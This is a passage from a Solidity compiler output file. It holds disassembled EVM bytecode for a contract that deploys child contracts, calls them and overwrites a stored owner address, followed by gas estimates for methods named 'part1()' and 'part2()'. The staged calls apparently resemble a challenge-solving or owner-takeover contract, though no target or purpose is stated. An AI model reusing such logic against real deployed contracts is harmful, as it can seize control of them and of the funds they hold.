PUSH2 0x1FB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x7B103999 PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x291 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x2A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP PUSH2 0x2B4 PUSH2 0x38D JUMP JUMPDEST DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO ISZERO PUSH2 0x300 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CECD719 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x365 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x376 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x144 DUP1 PUSH2 0x39E DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x474 DUP1 PUSH2 0x4E2 DUP4 CODECOPY ADD SWAP1 JUMP STOP PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH2 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST JUMPDEST PUSH2 0x125 DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE CALLDATASIZE ISZERO PUSH1 0x3D JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x8DA5CB5B EQ PUSH1 0x82 JUMPI JUMPDEST JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST STOP JUMPDEST CALLVALUE ISZERO PUSH1 0x8C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x92 PUSH1 0xD4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xdb 0xb5 SWAP16 0xb5 0xa6 DUP6 MOD 0xe DUP14 PUSH22 0x3DB2E027A8F4A06C42BD5EA211C7A336438E88AEDB2D STOP 0x29 PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH2 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x474 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 MSTORE DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2CFEACA DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB39C4593 PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0xC5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD MSTORE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x131 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x142 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x40 MLOAD DUP1 MLOAD SWAP1 POP PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST POP JUMPDEST PUSH2 0x2D7 DUP1 PUSH2 0x19D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x3CECD719 EQ PUSH2 0x54 JUMPI DUP1 PUSH4 0x7CEAB3B1 EQ PUSH2 0x69 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xBE JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE ISZERO PUSH2 0x5F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH2 0x113 JUMP JUMPDEST STOP JUMPDEST CALLVALUE ISZERO PUSH2 0x74 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x7C PUSH2 0x27D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE ISZERO PUSH2 0xC9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xD1 PUSH2 0x2A2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC4D66DE8 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x1CE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x1DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CECD719 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2C6 GAS SUB CALL ISZERO ISZERO PUSH2 0x277 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 ADDRESS SWAP1 POP JUMPDEST SWAP1 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xc0 PUSH11 0xDA0081E48A81E21D9CE4C2 GT LOG3 DUP8 OR 0xbf EXP 0xd3 CALLVALUE PUSH14 0x7D5FDADB52381EA2FAAC0029A165 PUSH3 0x7A7A72 ADDRESS PC KECCAK256 0xde STATICCALL SWAP9 0xbb CALLDATALOAD 0xab CALLDATACOPY 0x1e DIFFICULTY GT NOT 0x2d PUSH32 0x157F57BA4CCF1451194B3A4C28C5B8D91DD32100290000000000000000000000 "
        },
        "gasEstimates": {
          "creation": {
            "codeDepositCost": "486600",
            "executionCost": "20858",
            "totalCost": "507458"
          },
          "external": {
            "part1()": "infinite",
            "part2()": "infinite"
          }
        },
        "methodIdentifiers": {
          "part1()": "d83408fb",
          "part2()": "3b6cf550"
        }
      },
      "userdoc": {
        "methods": {}
      }
    }
  }
}